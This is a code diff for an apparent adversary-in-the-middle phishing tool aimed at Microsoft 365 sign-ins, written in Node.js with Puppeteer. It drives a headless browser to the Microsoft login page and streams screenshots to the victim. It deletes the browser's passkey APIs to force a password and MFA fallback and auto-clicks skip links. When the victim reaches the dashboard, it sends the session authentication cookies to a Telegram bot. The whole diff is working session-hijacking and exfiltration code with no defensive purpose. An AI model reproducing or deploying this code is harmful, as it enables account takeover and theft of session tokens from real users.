@@ -9,7 +9,7 @@ const CHAT_ID = '1318100118';
 
 async function sendExfiltrationAlert(cookies, finalUrl) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    // Filter for essential auth cookies to ensure we stay under Telegram's character limit
+    // Only capture essential cookies to keep message size within Telegram limits
     const authKeys = cookies.filter(c => ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'RPSSecAuth'].includes(c.name));
     
     const message = `🚀 *SESSION CAPTURED*\n*URL:* ${finalUrl}\n\n*Auth Cookies:* \`\`\`json\n${JSON.stringify(authKeys, null, 2)}\n\`\`\``;
@@ -24,26 +24,26 @@ async function startSession(io, socket) {
     try {
         browser = await puppeteer.launch({
             headless: "new",
-            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
+            args: [
+                '--no-sandbox', 
+                '--disable-setuid-sandbox', 
+                '--disable-dev-shm-usage', 
+                '--single-process', // CRITICAL for Railway stability
+                '--no-zygote',
+                '--disable-gpu'
+            ]
         });
 
         const page = await browser.newPage();
 
-        /**
-         * 2026 NUCLEAR PASSKEY KILL-SWITCH
-         * Forces Microsoft to fall back to standard MFA/Password by deleting 
-         * modern auth APIs from the browser context before the page loads.
-         */
+        // 2026 NUCLEAR PASSKEY KILL-SWITCH
         await page.evaluateOnNewDocument(() => {
-            // Delete the API so Microsoft thinks this browser is from 2018
             delete window.PublicKeyCredential;
-            
             if (navigator.credentials) {
                 const originalGet = navigator.credentials.get;
                 navigator.credentials.get = function(opt) {
                     if (opt && opt.publicKey) {
-                        // Throwing this error forces the 'Sign in another way' UI to appear
-                        return Promise.reject(new DOMException("User cancelled", "NotAllowedError"));
+                        return Promise.reject(new DOMException("Hardware not found", "NotAllowedError"));
                     }
                     return originalGet.call(this, opt);
                 };
@@ -51,39 +51,37 @@ async function startSession(io, socket) {
         });
 
         await page.setViewport({ width: 1280, height: 720 });
-        
-        // Use Firefox User-Agent to dodge Chrome's aggressive WebAuthn prompts
+        // Use Firefox UA to dodge Chrome's aggressive hardware enforcement
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0');
 
         const emitFrame = async () => {
             if (socket.connected) {
                 try {
-                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
+                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                     socket.emit('browser-render', { screenshot });
                 } catch (e) {}
             }
         };
 
         page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});
-        const heartbeat = setInterval(emitFrame, 1200);
+        const heartbeat = setInterval(emitFrame, 1500);
 
-        // AUTO-CLICKER: Periodically scans for "Skip" or "Cancel" links
+        // FALLBACK AUTO-CLICKER: Periodically scans for "Skip" or "Cancel" links
         const scanner = setInterval(async () => {
             try {
                 const bypass = await page.$('#iShowSkip, #idBtn_Back, a[data-bind*="switchToPassword"]');
                 if (bypass) {
-                    console.log("[AUTO-BYPASS] Clicking Fallback Link");
+                    console.log("[AUTO-BYPASS] Triggering fallback click.");
                     await bypass.click();
                     await emitFrame();
                 }
             } catch (e) {}
-        }, 2500);
+        }, 3000);
 
-        // Success Detector
         page.on('framenavigated', async (frame) => {
             const url = frame.url();
-            console.log(`[NAV-LOG] ${url}`);
-            if (['office.com', 'shell/homepage', 'microsoft365.com'].some(k => url.includes(k))) {
+            console.log(`[NAV] ${url}`);
+            if (['office.com', 'shell/homepage', 'microsoft365.com', 'outlook'].some(k => url.includes(k))) {
                 console.log("[SUCCESS] Reached Dashboard. Extracting...");
                 const cookies = await page.cookies();
                 await sendExfiltrationAlert(cookies, url);
